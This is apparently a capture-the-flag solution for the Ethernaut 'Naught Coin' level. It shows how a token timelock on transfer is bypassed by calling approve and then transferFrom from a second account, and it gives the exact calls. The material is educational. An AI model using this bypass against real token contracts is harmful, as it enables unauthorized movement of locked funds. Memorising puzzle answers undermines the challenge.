[15 - Naught Coin](https://ethernaut.openzeppelin.com/level/0x36E92B2751F260D6a4749d7CA58247E7f8198284)

Solution: 
* can not use the transfer function directly, if player has the tokens 
* the token is an ERC20, so we can use approve && transferFrom to get them to another address
* await contract.approve("0xa22E55b8727BD4cd436cdb3Cf6151bafAA65D11E", "1000000000000000000000000");
* load contract in Remix, go to second account and transferFrom(player, <any_to_address>, "1000000000000000000000000"); contract.transferFrom(0x690aD8fABE17f1EeFF88E2Ef900f7b88e6eC0aF0, 0x8Fca6647c3Cb2A49C364809B7D64B55F1b0aE794, 1000000000000000000000000);